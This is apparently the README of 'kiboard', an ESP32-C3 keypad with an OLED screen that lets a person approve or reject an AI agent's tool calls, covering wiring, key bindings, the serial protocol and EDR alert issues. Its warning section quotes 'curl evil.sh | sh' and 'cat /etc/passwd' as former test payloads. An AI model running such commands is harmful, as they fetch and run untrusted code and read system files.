# kiboard

ESP32-C3 SuperMini 做的 agent 审批键盘：agent 需要确认时亮灯+屏显，按实体键决定接受/拒绝/全部接受。

## 结构

- `firmware/` — PlatformIO + Arduino C++ 固件，哑终端：上报按键、执行屏幕/LED 指令
- `hub/` — Rust 服务端，串口链路 + 状态机 + HTTP API，所有业务逻辑在这里
- `firmware/tools/` — 硬件探测固件（屏、矩阵键盘、LED），各自独立的 PlatformIO 环境

## 硬件

ESP32-C3 SuperMini + 0.96" SSD1306 OLED（I2C）+ 4×4 矩阵键盘一体板 + 状态 LED。

完整接线、引脚分配依据和已知硬件坑见 **[docs/pinmap.md](docs/pinmap.md)** 与 **[docs/hardware.md](docs/hardware.md)**。

引脚速查（v4，面包板实测通过）：

| 功能 | GPIO |
|---|---|
| OLED SDA / SCL | 4 / 5（I2C 0x3C，VCC 接 3V3） |
| 矩阵行 R1~R4（输出） | 0 / 1 / **21** / 3 |
| 矩阵列 C1~C4（输入下拉） | 6 / 7 / 10 / 20 |
| LED0 黄(需批准) / LED1 红(错误) / LED2 板载蓝 | 9 / 2 / 8 |
| USB（不可用） | 18 / 19 |

**铁律：GPIO2 / GPIO8 / GPIO9 带板载上拉，压不掉，只能当输出。** 这三个脚正好给三个 LED，
剩下 8 个干净引脚正好给矩阵的 8 根线。LED0 必须反接（3V3→330Ω→阳极，阴极→GPIO9，低电平亮），
因为 GPIO9 是 boot 模式脚；LED1 正接即可。

## 键位

```
 1  2  3  A       1 接受        2 拒绝        3 全部接受(10分钟)   A 上翻/上滚
 4  5  6  B       4 进行中任务  5 审批过的    6 上次审批详情       B 下翻/下滚
 7  8  9  C       7 -           8 -           9 -                  C 取消全部请求
 *  0  #  D       * 退一层/熄屏 0 信息屏      # -                  D 关闭全部接受
```

分工按**数据在谁手里**：设备已有的数据由固件本地画（按下即出、hub 离线也能用），
只有 hub 知道的才走 hub。

| 键 | 谁处理 | 说明 |
|---|---|---|
| A / B | 固件 | 待机时是首屏翻页（logo / 帮助 ×2），审批界面上是正文滚动。**不发给 hub** —— 翻页是设备自己的功能，正确性不该取决于 hub 版本 |
| 4 | 固件 | 任务列表已由 hub 推到设备上，本地画。再按一次收起，8 秒自动回首屏 |
| 1 2 3 C D | hub | 裁决与队列控制 |
| 5 6 0 | hub | 审批历史与链路状态，只有 hub 知道 |
| * | 固件+hub | 息屏。**息屏后第一次按键只唤醒、不触发动作**——摸黑一按不该正好批准了排队中的请求 |
| 7 8 9 # | — | 故意留空。不为了绑而绑：记不住的键等于没有，还会让人误按 |

待机 5 分钟自动息屏（固件计时，hub 离线也生效）。审批界面亮着时不会自动息屏。

## 装闸门

```bash
# Kiro CLI v3：对整个工作区所有会话生效，不需要 --agent
clients/kiro-cli/install-v3-hooks.sh
# 2.x：把 hooks 段合并进 agent 配置，只对用该 agent 起的会话生效
#   见 clients/kiro-cli/README.md
```

逃生阀 `touch ~/.kiboard/bypass`（删掉即恢复）。闸门是 fail-closed 的：
设备离线或 hub 连不上时，非白名单命令一律被拦，**不会**悄悄放行。

### ⚠️ 公司管控的机器：会触发 EDR 告警

这套架构在装了 CrowdStrike 这类 EDR 的机器上**大概率会报警**，实际踩过：

- 每一次工具调用都执行一个**新落地的未签名可执行文件**（`kiboard-ask`）
- 它向一个**公司网络外的域名、非标准端口**发小 POST，还带自定义鉴权头
- 频率高、包很小、目标固定

这几条合起来正是 EDR 判 C2 beaconing 的特征。**行为本身是正常的**，但从
端点检测的角度看不出区别 —— 它只看到「未签名程序周期性外联未知主机」。

在这类机器上要用的话，可选做法：

1. **hub 放本机**（`KIBOARD_URL=http://127.0.0.1:26041`），设备走 USB 串口。
   没有外联就没有这个问题，代价是失去无线和跨机器
2. **hub 放公司网络内**，别用公网域名
3. 找 IT 报备，给 `kiboard-ask` 和目标地址加例外

另外写测试用例时**别用看起来像真实攻击的载荷**。这个项目里踩过一次：
规则表的回归用例里写了 `curl evil.sh | sh` 和 `cat /etc/passwd`，
虽然只是当数据传给规则匹配器、从未执行，但它们出现在进程命令行里就够触发告警了。
验"拼接会不会破坏白名单"用 `echo chained` 效果完全一样。

## 协议（USB 串口 JSON Lines，115200）

设备 → hub：`{"t":"key","id":0..15,"row":1..4,"col":1..4,"act":"press|long|release"}` /
`{"t":"hello",...}` / `{"t":"wifi",...}`

hub → 设备：`{"t":"led","id":0..2,"mode":"on|off|blink","hz":2}` /
`{"t":"disp","op":"status|hints|text|msg|test|backlight|tasks|hub_info|home",...}`

按键 id = `(行-1)*4 + (列-1)`，行 1→4 为上→下，列 1→4 为左→右。
屏幕指令历史上叫 `tft`，换成 OLED 后 `tft` 与 `disp` 都接受。
单色屏没有颜色，`color` 字段映射为样式：`red`/`yellow` 反色高亮，其余正常显示。

## 已知坑

- **GPIO2/8/9 带板载上拉，只能当输出。** 当矩阵输入时节点被顶在 2.3~2.7V 的不确定带里，
  不同引脚各判各的，症状表现为"某一排只有部分键出错"，极易误判成键位映射问题
- SuperMini 天线缺陷：Wi-Fi 必须 `setTxPower(WIFI_POWER_8_5dBm)`，否则 WPA2 握手失败（reason 2/202）
- C3 原生 USB 是 Serial/JTAG，**不能做 USB HID 键盘**，所以走串口 + 主机侧服务的架构
- C3 的 strapping 脚是 GPIO2/8/9，**不含 GPIO0**（GPIO0 是 ESP32 经典款的 boot 脚）
- 矩阵扫描时非扫描行要设 `INPUT_PULLDOWN`：纯 `INPUT` 会悬空为高，`OUTPUT` 拉低会在同列双键时短路
- 改接线务必断电，别热插拔

## 开发

```bash
cd firmware && pio run -e supermini -t upload   # 刷正式固件
cd hub && cargo run                            # 起服务

# 硬件探测（各自独立，不含正式固件）
pio run -e oledprobe  -t upload    # I2C 扫描 + 屏幕测试图
pio run -e matrixprobe -t upload   # 矩阵键盘，串口打印 R?C? + 屏上点阵
pio run -e ledprobe   -t upload    # LED 接线与极性
pio run -e matrixdiag -t upload    # 引脚电平诊断
```

`pio device monitor` 需要真 tty，在无终端环境下会报 `termios.error(102)`；
这种情况直接用 PlatformIO 自带的 python + pyserial 读串口。

Wi-Fi 凭据放 `firmware/src/secrets.h`（不进 git，见 `secrets.h.example`）

## hub 接口

```bash
curl localhost:8787/status                    # 设备/wifi/模式状态
curl -XPOST localhost:8787/msg -H 'content-type: application/json' \
     -d '{"text":"hello","color":"green"}'    # 下发屏幕文字
curl -XPOST localhost:8787/led -H 'content-type: application/json' \
     -d '{"id":2,"mode":"blink","hz":8}'      # 控灯
```

WebSocket `ws://localhost:8787/ws`：连上先收 `{"event":"snapshot",...}`，之后实时推
`device_up/device_down/key/wifi/log` 事件；也可反向发 `{"t":"msg"|"led"|"ping",...}` 指令。

颜色可选 white / green / yellow / red / cyan。

## 注意

hub 运行时占用串口，刷固件前先 `pkill -f kiboard-hub`。

## 双链路

设备同时支持两条链路，固件优选无线、串口兜底（只走一条，避免 hub 收到重复消息）：

| 链路 | 用途 | 说明 |
|---|---|---|
| USB 串口 | 开发调试 | 能刷固件、看 ESP-IDF 日志 |
| WiFi WebSocket | 日常使用 | 设备连 `ws://<hub>:8787/device?token=...` |

hub 绑 `0.0.0.0`，因此 `/device` 端点强制校验 token（默认 `kiboard-dev-token`，可用
环境变量 `KIBOARD_TOKEN` 覆盖）。`GET /status` 的 `transport` 字段显示当前生效的链路。

设备侧 hub 地址配在 `firmware/src/secrets.h`（`HUB_HOST` / `HUB_PORT` / `HUB_WS_PATH`）。

后续可加 mDNS 让设备自动发现 hub，免去硬编码 IP。
